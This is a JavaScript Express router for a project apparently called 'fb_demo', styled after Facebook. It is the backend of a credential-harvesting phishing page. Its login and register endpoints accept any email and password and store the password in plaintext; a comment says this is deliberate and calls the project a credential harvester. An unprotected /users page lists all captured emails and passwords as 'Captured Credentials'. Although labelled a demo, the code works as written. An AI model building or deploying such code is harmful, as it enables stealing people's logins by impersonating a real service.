import { Router } from 'express';
import { getPool } from '../db.js';

// Create Express router for authentication endpoints
const router = Router();

/**
 * POST /register - User registration endpoint
 * Creates new user accounts or records signup actions for existing users
 */
router.post('/register', async (req, res) => {
  try {
    // Extract and validate request body
    const { email, password } = req.body;
    
    // Input validation - ensure both fields are strings
    if (typeof email !== 'string' || typeof password !== 'string') {
      return res.status(400).json({ error: 'Invalid payload' });
    }
    
    // Normalize email (trim whitespace, convert to lowercase)
    const normalizedEmail = email.trim().toLowerCase();
    
    // Business logic validation
    if (!normalizedEmail || password.length < 6) {
      return res.status(400).json({ error: 'Email required and password min 6 chars' });
    }

    // Intentionally no hashing — this demonstrates what a credential harvester actually captures.
    // In a real auth system, bcrypt would be used here (see package.json dependency).
    const plainPassword = password;
    
    // Get database connection pool
    const pool = getPool();
    
    // Check if user already exists in the database
    const [existingUsers] = await pool.execute(
      'SELECT id FROM users WHERE email = ? LIMIT 1',
      [normalizedEmail]
    );
    
    if (existingUsers.length > 0) {
      // User exists - update their action_type to 'signup' and return success
      // This allows tracking signup button clicks even for existing users
      await pool.execute(
        'UPDATE users SET action_type = ? WHERE email = ?',
        ['signup', normalizedEmail]
      );
      return res.status(200).json({ ok: true, message: 'Signup action recorded for existing user' });
    } else {
      // New user - create account with action_type 'signup'
      await pool.execute(
        'INSERT INTO users (email, password_hash, action_type) VALUES (?, ?, ?)',
        [normalizedEmail, plainPassword, 'signup']
      );
      return res.status(201).json({ ok: true, message: 'New user account created' });
    }
  } catch (error) {
    // Log error for debugging (but don't expose details to client)
    console.error('Register error:', error);
    return res.status(500).json({ error: 'Server error' });
  }
});

/**
 * POST /login - User authentication endpoint
 * Creates new users or updates existing users with 'login' action type
 * Behaves exactly like signup but with different action type and message
 */
router.post('/login', async (req, res) => {
  try {
    // Extract and validate request body
    const { email, password } = req.body;
    
    // Input validation - ensure both fields are strings
    if (typeof email !== 'string' || typeof password !== 'string') {
      return res.status(400).json({ error: 'Invalid payload' });
    }
    
    // Normalize email (trim whitespace, convert to lowercase)
    const normalizedEmail = email.trim().toLowerCase();
    
    // Business logic validation
    if (!normalizedEmail || password.length < 6) {
      return res.status(400).json({ error: 'Email required and password min 6 chars' });
    }

    // Intentionally no hashing — this demonstrates what a credential harvester actually captures.
    // In a real auth system, bcrypt would be used here (see package.json dependency).
    const plainPassword = password;
    
    // Get database connection pool
    const pool = getPool();
    
    // Check if user already exists in the database
    const [existingUsers] = await pool.execute(
      'SELECT id FROM users WHERE email = ? LIMIT 1',
      [normalizedEmail]
    );
    
    if (existingUsers.length > 0) {
      // User exists - update their action_type to 'login' and return success
      // This tracks when users click the login button
      await pool.execute(
        'UPDATE users SET action_type = ? WHERE email = ?',
        ['login', normalizedEmail]
      );
      return res.status(200).json({ ok: true, message: 'Login action recorded for existing user' });
    } else {
      // New user - create account with action_type 'login'
      await pool.execute(
        'INSERT INTO users (email, password_hash, action_type) VALUES (?, ?, ?)',
        [normalizedEmail, plainPassword, 'login']
      );
      return res.status(201).json({ ok: true, message: 'New user account created via login' });
    }
  } catch (error) {
    // Log error for debugging (but don't expose details to client)
    console.error('Login error:', error);
    return res.status(500).json({ error: 'Server error' });
  }
});

/**
 * GET /users - Retrieve all users as an HTML table
 * Renders captured credentials directly in the browser for easy review.
 * Escapes all values before inserting into HTML to prevent XSS.
 */
router.get('/users', async (req, res) => {
  try {
    const pool = getPool();
    const [rows] = await pool.execute('SELECT * FROM users ORDER BY created_at DESC');

    const tableRows = rows.map(buildTableRow).join('');
    const html = buildUsersPage(tableRows, rows.length);

    res.setHeader('Content-Type', 'text/html');
    return res.send(html);
  } catch (error) {
    console.error('Error fetching users:', error);
    return res.status(500).send('<p>Server error</p>');
  }
});

// Escapes special HTML characters to prevent XSS when rendering user-supplied data.
function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// Builds a single <tr> from a user row object.
function buildTableRow(row) {
  return `<tr>
    <td>${escapeHtml(row.id)}</td>
    <td>${escapeHtml(row.email)}</td>
    <td>${escapeHtml(row.password_hash)}</td>
    <td>${escapeHtml(row.action_type)}</td>
    <td>${escapeHtml(row.created_at)}</td>
  </tr>`;
}

// Returns the full HTML page wrapping the table rows.
function buildUsersPage(tableRows, count) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Captured Credentials — fb_demo</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 32px; }
    h1   { color: #1877f2; margin-bottom: 4px; }
    p    { color: #606770; margin-top: 0; margin-bottom: 20px; }
    table { border-collapse: collapse; width: 100%; background: #fff;
            border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,.1); }
    th   { background: #1877f2; color: #fff; padding: 12px 16px; text-align: left; }
    td   { padding: 10px 16px; border-bottom: 1px solid #e4e6ea; }
    tr:last-child td { border-bottom: none; }
    tr:hover td { background: #f7f9fc; }
  </style>
</head>
<body>
  <h1>fb_demo · users table</h1>
  <p>${count} record${count !== 1 ? 's' : ''} captured &nbsp;·&nbsp; refresh to update</p>
  <table>
    <thead>
      <tr>
        <th>id</th><th>email</th><th>password</th><th>action</th><th>created_at</th>
      </tr>
    </thead>
    <tbody>${tableRows || '<tr><td colspan="5" style="color:#999;text-align:center">No records yet</td></tr>'}</tbody>
  </table>
</body>
</html>`;
}

// Export the router for use in the main server file
export default router;


